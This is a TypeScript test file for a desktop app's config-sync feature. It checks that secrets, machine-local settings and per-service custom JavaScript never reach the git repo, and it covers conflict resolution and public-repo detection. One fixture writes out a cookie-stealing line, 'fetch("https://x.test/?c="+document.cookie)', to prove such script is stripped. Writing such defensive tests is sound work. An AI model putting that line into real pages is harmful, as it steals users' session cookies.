// Config sync policy.
//
// The transport is git; this is the part that decides what travels. It's tested harder than its
// size suggests because the failure modes are all silent and all expensive: a synced FCM
// registration breaks push on both machines, a synced window bound strands the window offscreen,
// and a synced config missing an account makes every service that used it permanently unloadable.

import { describe, it, expect } from 'vitest';
import {
  applyIncoming,
  hasDiverged,
  LOCAL_ONLY_KEYS,
  portable,
  PORTABLE_KEYS,
  serialise,
  validateIncoming,
  decideSync,
  resolveRepoPath,
  restoreLocalPreferences,
  parseRemote,
  probeUrlFor,
  publicRepoRefusal,
  PUBLIC_FORGES,
  visibilityFromStatus,
} from '@core/config/sync';
import { DEFAULT_PREFERENCES } from '@core/config/preferences';
import type { Config } from '@shared/types';

const svc = (id: string, accountId = 'a1') => ({
  id,
  catalogId: 'gmail',
  name: id,
  accountId,
  notifications: true,
  hibernate: true,
  zoom: 1,
});

function config(over: Partial<Config> = {}): Config {
  return {
    version: 4,
    preferences: DEFAULT_PREFERENCES,
    accounts: [{ id: 'a1', label: 'Google', provider: 'google', partition: 'persist:grp-google' }],
    services: [svc('one'), svc('two')],
    workspaces: [{ id: 'w', name: 'All', items: [] }],
    activeWorkspaceId: 'w',
    layouts: { w: { panes: [{ id: 'p', serviceId: 'one' }], focusedPaneId: 'p' } },
    pushRegistrations: [{ serviceId: 'one', vapidKey: 'k', credentials: { t: 1 }, seenIds: ['x'] }],
    window: { x: 0, y: 0, width: 1440, height: 900 },
    ...over,
  } as Config;
}

describe('what travels', () => {
  it('carries services, accounts, workspaces and preferences', () => {
    const p = portable(config()) as Record<string, unknown>;
    for (const key of PORTABLE_KEYS) expect(p, key).toHaveProperty(key);
  });

  it('NEVER carries push registrations — one endpoint, one receiver', () => {
    // An FCM registration is bound to a single receiver. Two machines holding the same endpoint
    // means both are wrong and neither gets the notification.
    expect(portable(config())).not.toHaveProperty('pushRegistrations');
  });

  it('NEVER CARRIES A SERVICE\'S CUSTOM JAVASCRIPT — anyone who can push would run script in your Gmail', () => {
    const withJs = config({ services: [{ ...svc('one'), customJs: 'fetch("https://x.test/?c="+document.cookie)' }, svc('two')] });
    const out = serialise(withJs);
    expect(out).not.toContain('customJs');
    expect(out).not.toContain('document.cookie');
    // The rest of the service still travels.
    expect((portable(withJs).services ?? []).map((s) => s.id)).toEqual(['one', 'two']);
  });

  it('an incoming config keeps THIS machine\'s custom JavaScript, and never adopts a repo\'s', () => {
    const local = config({ services: [{ ...svc('one'), customJs: 'mine()' }, svc('two')] });
    const incoming = portable(config()) as ReturnType<typeof portable>;
    // As if the repo had been edited to carry script for both services.
    for (const s of incoming.services) (s as { customJs?: string }).customJs = 'theirs()';

    const restored = restoreLocalPreferences(incoming, local);
    const byId = Object.fromEntries(restored.services.map((s) => [s.id, s.customJs]));
    expect(byId['one']).toBe('mine()');
    expect(byId['two']).toBeUndefined();
  });

  it('never carries window bounds or layouts — both are display-shaped', () => {
    // A 4-pane split from a 32" monitor is unusable on a 13" laptop, and restoreBounds would
    // strand the window offscreen.
    expect(portable(config())).not.toHaveProperty('window');
    expect(portable(config())).not.toHaveProperty('layouts');
  });

  it('the two key lists do not overlap', () => {
    // An allowlist and a blocklist that disagree is how a machine-local secret ends up shared.
    for (const key of LOCAL_ONLY_KEYS) {
      expect(PORTABLE_KEYS as readonly string[]).not.toContain(key);
    }
  });
});

describe('divergence detection', () => {
  it('an identical config has not diverged', () => {
    expect(hasDiverged(config(), config())).toBe(false);
  });

  it('IGNORES machine-local changes — a window move must not trigger a commit', () => {
    // Bounds are saved on a 400ms debounce. If they counted, every nudge of the window would be a
    // commit and push, and the feature would be switched off within a day.
    const moved = config({ window: { x: 500, y: 500, width: 800, height: 600 } });
    expect(hasDiverged(config(), moved)).toBe(false);
  });

  it('ignores a layout change but notices a service change', () => {
    expect(hasDiverged(config(), config({ layouts: {} }))).toBe(false);
    expect(hasDiverged(config(), config({ services: [svc('one')] }))).toBe(true);
  });

  it('notices a preference change', () => {
    const p = { ...DEFAULT_PREFERENCES, appearance: { ...DEFAULT_PREFERENCES.appearance, railPosition: 'right' as const } };
    expect(hasDiverged(config(), config({ preferences: p }))).toBe(true);
  });

  it('KEY ORDER IS NOT A DIFF', () => {
    // JSON.stringify preserves insertion order, so two identical configs built in different orders
    // would produce a diff — and a sync that commits on every launch is one nobody keeps enabled.
    const a = config();
    const reordered = { ...config() } as Record<string, unknown>;
    const rebuilt = Object.fromEntries(Object.entries(reordered).reverse()) as unknown as Config;
    expect(hasDiverged(a, rebuilt)).toBe(false);
  });

  it('serialises deterministically and ends with a newline, so git diffs stay clean', () => {
    expect(serialise(config())).toBe(serialise(config()));
    expect(serialise(config()).endsWith('\n')).toBe(true);
  });
});

describe('applying an incoming config', () => {
  it('takes the portable half and KEEPS every local field', () => {
    const local = config();
    const incoming = portable(config({ services: [svc('three')] }));
    const merged = applyIncoming(local, incoming);

    expect(merged.services.map((s) => s.id)).toEqual(['three']);
    // The three that would break something if they travelled.
    expect(merged.pushRegistrations).toEqual(local.pushRegistrations);
    expect(merged.window).toEqual(local.window);
    expect(merged.layouts).toEqual(local.layouts);
  });

  it('is a whole-file replacement, not a field merge', () => {
    // A structural merge has to guess when both machines renamed the same service, and a wrong
    // guess can cost an account-to-partition mapping. Git already models that disagreement.
    const local = config();
    const incoming = portable(config({ accounts: [] , services: []}));
    expect(applyIncoming(local, incoming).accounts).toEqual([]);
  });
});

describe('validating what arrived', () => {
  const local = config();

  it('accepts a well-formed config', () => {
    const result = validateIncoming(portable(config()), local);
    expect(result.ok).toBe(true);
  });

  it('rejects anything that is not a config object', () => {
    for (const bad of [null, undefined, 'text', 42, []]) {
      expect(validateIncoming(bad, local).ok, JSON.stringify(bad)).toBe(false);
    }
  });

  it('REJECTS A SERVICE WHOSE ACCOUNT IS MISSING', () => {
    // partitionFor throws on a dangling accountId, so the service becomes permanently unloadable —
    // and it's a service you never touched on this machine.
    const broken = portable(config({ services: [svc('one', 'gone')] }));
    const result = validateIncoming(broken, local);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toMatch(/account/);
  });

  it('rejects a config that would empty a non-empty rail', () => {
    // Losing one service is ordinary. Losing all of them is worth refusing, because a sync that
    // silently empties your rail looks exactly like a sync that worked.
    const emptied = portable(config({ services: [] }));
    expect(validateIncoming(emptied, local).ok).toBe(false);
  });

  it('ALLOWS an empty rail when this machine is also empty', () => {
    // A genuinely fresh machine, or one where you deliberately removed everything.
    const emptied = portable(config({ services: [] }));
    expect(validateIncoming(emptied, config({ services: [] })).ok).toBe(true);
  });

  it('rejects a missing accounts array rather than treating it as empty', () => {
    const noAccounts = { ...portable(config()), accounts: undefined } as never;
    expect(validateIncoming(noAccounts, local).ok).toBe(false);
  });
});

// A2 — the P0. Without a last-synced base there is no way to tell "the remote is newer" from
// "I have local changes that never pushed", and the old code assumed the former every time.
describe('the three-way decision', () => {
  const decide = (local: string, remote: string | null, base: string | null) =>
    decideSync({ local, remote, base });

  it('nothing changed on either side', () => {
    expect(decide('A', 'A', 'A')).toEqual({ kind: 'up-to-date' });
  });

  it('the remote moved and we did not — apply it', () => {
    expect(decide('A', 'B', 'A')).toEqual({ kind: 'apply-remote' });
  });

  it('WE MOVED AND THE REMOTE DID NOT — push, do not overwrite ourselves', () => {
    // This is the data-loss case. Add a service, quit before the debounce fires, relaunch: local
    // is ahead of both base and remote, and the old code applied the remote over it.
    expect(decide('B', 'A', 'A')).toEqual({ kind: 'push-local' });
  });

  it('both moved differently — refuse and report', () => {
    const action = decide('B', 'C', 'A');
    expect(action.kind).toBe('conflict');
  });

  it('both moved to the SAME thing is not a conflict', () => {
    // Two machines can legitimately make the same edit. Refusing here would be noise.
    expect(decide('B', 'B', 'A')).toEqual({ kind: 'up-to-date' });
  });

  it('an empty repo is seeded from this machine', () => {
    expect(decide('A', null, null)).toEqual({ kind: 'push-local' });
  });

  it('an empty repo with a base means the repo was emptied — still push', () => {
    expect(decide('A', null, 'A')).toEqual({ kind: 'push-local' });
  });
});

describe('a missing base', () => {
  // Every install that already had sync configured starts here, and so does anyone who deletes the
  // sidecar. We genuinely cannot tell who is ahead.
  it('adopts silently when the two sides already agree', () => {
    expect(decideSync({ local: 'A', remote: 'A', base: null })).toEqual({ kind: 'up-to-date' });
  });

  it('REFUSES when they differ, rather than guessing', () => {
    const action = decideSync({ local: 'A', remote: 'B', base: null });
    expect(action.kind).toBe('conflict');
    if (action.kind === 'conflict') expect(action.detail).toMatch(/previous sync/);
  });
});

describe('machine-local preferences never travel', () => {
  const withPrefs = (over: Record<string, unknown>) =>
    config({ preferences: { ...DEFAULT_PREFERENCES, ...over } as never });

  it('THE FIREBASE CREDENTIAL IS STRIPPED — it must never reach a git repo', () => {
    // An API key committed to a dotfiles repo is wrong even when the repo is private, and a leak
    // when it isn't.
    const local = withPrefs({
      notifications: { ...DEFAULT_PREFERENCES.notifications, firebase: { projectId: 'p', appId: 'a', apiKey: 'SECRET', messagingSenderId: 'm' } },
    });
    expect(serialise(local)).not.toContain('SECRET');
    expect(serialise(local)).not.toContain('apiKey');
  });

  it('the sync repo path is stripped — otherwise the transport kills itself', () => {
    const local = withPrefs({ sync: { repoPath: '/Users/alice/dotfiles' } });
    expect(serialise(local)).not.toContain('/Users/alice');
  });

  it('the proxy, downloads folder, dndUntil and the launchd settings are stripped', () => {
    const local = withPrefs({
      network: { proxy: { mode: 'http' as const, host: 'work-proxy.internal', port: 8080 } },
      downloads: { folder: '/Users/alice/Downloads', askWhereToSave: false, openOnComplete: false, notify: true },
    });
    const out = serialise(local);
    expect(out).not.toContain('work-proxy.internal');
    expect(out).not.toContain('/Users/alice/Downloads');
    expect(out).not.toContain('dndUntil');
    expect(out).not.toContain('launchAtLogin');
    // A launchd job registered on this Mac has no business being adopted by another one.
    expect(out).not.toContain('relaunchOnCrash');
  });

  it('portable preferences still travel', () => {
    const out = serialise(config());
    expect(out).toContain('railPosition');
    expect(out).toContain('hibernateAfterMinutes');
    // `push` travels even though the credentials don't — the other machine shows it as pending.
    expect(out).toContain('"push"');
  });

  it('CHANGING A LOCAL-ONLY PREFERENCE IS NOT A DIVERGENCE', () => {
    // Otherwise setting a proxy on one machine would commit and push on every launch.
    const a = withPrefs({ network: { proxy: { mode: 'http' as const, host: 'x', port: 1 } } });
    const b = withPrefs({ network: { proxy: { mode: 'none' as const, host: '', port: 0 } } });
    expect(hasDiverged(a, b)).toBe(false);
  });

  it('restoreLocalPreferences puts this machine values back over an incoming config', () => {
    const local = withPrefs({ sync: { repoPath: '/mine' } });
    const incoming = portable(withPrefs({ sync: { repoPath: '/theirs' } }));
    const restored = restoreLocalPreferences(incoming, local);
    expect(restored.preferences.sync.repoPath).toBe('/mine');
  });

  it('neither helper mutates its input', () => {
    const local = withPrefs({ sync: { repoPath: '/mine' } });
    const before = JSON.stringify(local);
    portable(local);
    restoreLocalPreferences(portable(local), local);
    expect(JSON.stringify(local)).toBe(before);
  });
});

// Conflict resolution works by choosing the BASE, not by branching on the winner — set the base to
// the side being discarded and `decideSync` does the rest. Both branches originally wrote the
// remote, making them identical, so "Keep repo" pushed local over the repo.
describe('resolving a conflict by choosing the base', () => {
  const LOCAL = 'local-config';
  const REMOTE = 'remote-config';

  it('KEEP LOCAL discards the remote — base becomes the remote, so local is ahead', () => {
    expect(decideSync({ local: LOCAL, remote: REMOTE, base: REMOTE })).toEqual({
      kind: 'push-local',
    });
  });

  it('KEEP REMOTE discards local — base becomes local, so the remote is ahead', () => {
    expect(decideSync({ local: LOCAL, remote: REMOTE, base: LOCAL })).toEqual({
      kind: 'apply-remote',
    });
  });

  it('the two produce OPPOSITE actions — an identical base would silently invert one of them', () => {
    const keepLocal = decideSync({ local: LOCAL, remote: REMOTE, base: REMOTE }).kind;
    const keepRemote = decideSync({ local: LOCAL, remote: REMOTE, base: LOCAL }).kind;
    expect(keepLocal).not.toBe(keepRemote);
  });
});

// ---------------------------------------------------------------------------------------------
// Refusing to sync into a world-readable repo.
//
// The first design of this guard refused any remote on github.com/gitlab.com/bitbucket.org, which
// is where private dotfiles repos live — it would have fired on the correct case and been switched
// off within a day. The host list survives with the opposite job: marking where an anonymous 200 is
// worth believing. These tests exist mostly to keep it that way round.
// ---------------------------------------------------------------------------------------------

describe('parsing a git remote', () => {
  it.each([
    ['git@github.com:owner/repo.git', 'github.com', 'owner/repo'],
    ['git@github.com:owner/repo', 'github.com', 'owner/repo'],
    ['https://github.com/owner/repo.git', 'github.com', 'owner/repo'],
    ['https://github.com/owner/repo', 'github.com', 'owner/repo'],
    ['https://user@github.com/owner/repo.git', 'github.com', 'owner/repo'],
    ['ssh://git@github.com/owner/repo.git', 'github.com', 'owner/repo'],
    ['git://github.com/owner/repo.git', 'github.com', 'owner/repo'],
    // Nested GitLab groups: the whole path is the repo, so it can't be split into owner + name.
    ['git@gitlab.com:group/sub/repo.git', 'gitlab.com', 'group/sub/repo'],
    // Case and stray whitespace — `git remote get-url` output arrives with a trailing newline.
    ['  https://GitHub.com/Owner/Repo.git\n', 'github.com', 'Owner/Repo'],
  ])('%s', (url, host, path) => {
    expect(parseRemote(url)).toEqual({ host, path });
  });

  it.each([
    ['/Users/sam/dotfiles', 'an absolute local path'],
    ['../dotfiles', 'a relative path'],
    ['file:///Users/sam/dotfiles', 'a file URL'],
    ['', 'empty'],
    ['   ', 'whitespace'],
  ])('%s is not probeable (%s)', (url) => {
    expect(parseRemote(url)).toBeNull();
  });

  it('an https URL is not mistaken for scp-like syntax, despite containing a colon', () => {
    // The scp branch runs first and `https://host/path` has a colon. Without the lookahead it
    // would parse as host="https", path="//github.com/owner/repo" — and then probe nothing.
    expect(parseRemote('https://github.com/owner/repo')?.host).toBe('github.com');
  });
});

describe('choosing whether the probe is worth running', () => {
  it.each(PUBLIC_FORGES)('%s is probed', (host) => {
    expect(probeUrlFor({ host, path: 'owner/repo' })).toBe(`https://${host}/owner/repo`);
  });

  it('a self-hosted forge is NOT probed', () => {
    // The false positive that would kill this feature: an internal GitLab answers 200 to a laptop
    // on the VPN for a repo no outsider can reach. Refusing to sync to your own company's private
    // git server is exactly the kind of wrongness that gets a guard disabled permanently.
    expect(probeUrlFor({ host: 'git.internal.example', path: 'team/dotfiles' })).toBeNull();
  });

  it('a lookalike host is not probed', () => {
    expect(probeUrlFor({ host: 'github.com.evil.test', path: 'owner/repo' })).toBeNull();
  });
});

describe('the verdict table', () => {
  it('200 is the ONLY response that means public', () => {
    expect(visibilityFromStatus(200)).toBe('public');
  });

  const notPublic: [number | null, string][] = [
    [404, 'private or nonexistent — GitHub refuses to distinguish them, by design'],
    [403, 'what GitLab returns for a nonexistent project'],
    [429, 'rate limited'],
    [500, 'the forge is having a bad day'],
    [301, 'a redirect that fetch did not follow'],
    [null, 'offline, DNS failure, or the probe timed out'],
  ];
  it.each(notPublic)('%s does not mean public (%s)', (status, _why) => {
    expect(visibilityFromStatus(status)).toBe('unknown');
  });
});

describe('the refusal', () => {
  const url = 'https://github.com/owner/repo';

  it('refuses a confirmed-public repo, and names it', () => {
    const refusal = publicRepoRefusal({ visibility: 'public', allowPublicRepo: false, probeUrl: url });
    expect(refusal).toContain(url);
    // Says what is at stake, and what isn't — a warning that overstates gets ignored.
    expect(refusal).toContain('account labels');
    expect(refusal).toContain('Credentials are never written');
  });

  it('the override allows it', () => {
    expect(
      publicRepoRefusal({ visibility: 'public', allowPublicRepo: true, probeUrl: url })
    ).toBeNull();
  });

  it('FAILS OPEN — anything short of a confirmed 200 syncs', () => {
    // Deliberate. Publishing your own service list to your own repo is a risk you configured and
    // can see; sync silently breaking every time you open the laptop on a train is worse, and is
    // what actually erodes trust in the feature.
    expect(
      publicRepoRefusal({ visibility: 'unknown', allowPublicRepo: false, probeUrl: url })
    ).toBeNull();
  });
});

describe('the override does not travel', () => {
  it('allowPublicRepo is stripped from the synced file', () => {
    const withOverride = config({
      preferences: {
        ...DEFAULT_PREFERENCES,
        sync: { repoPath: '/somewhere', allowPublicRepo: true },
      },
    });
    // Writing "yes, I know this is public" into the public repo would be its own small absurdity,
    // and on the second machine it would pre-authorise a repo that machine never looked at.
    expect(serialise(withOverride)).not.toContain('allowPublicRepo');
  });
});

describe('the repo path as typed', () => {
  const home = '/Users/alice';

  it("THE PLACEHOLDER'S OWN FORM WORKS — ~/code/dotfiles was used verbatim and was not a repository", () => {
    expect(resolveRepoPath('~/code/dotfiles', home)).toBe('/Users/alice/code/dotfiles');
    expect(resolveRepoPath('~', home)).toBe('/Users/alice');
  });

  it('a relative path is from the home folder, not from / — which is where a Finder launch runs', () => {
    expect(resolveRepoPath('code/dotfiles', home)).toBe('/Users/alice/code/dotfiles');
  });

  it('absolute paths pass through; blank means sync is off', () => {
    expect(resolveRepoPath('/srv/config', home)).toBe('/srv/config');
    expect(resolveRepoPath('   ', home)).toBeNull();
    expect(resolveRepoPath(undefined, home)).toBeNull();
    expect(resolveRepoPath('  ~/x  ', `${home}/`)).toBe('/Users/alice/x');
  });
});
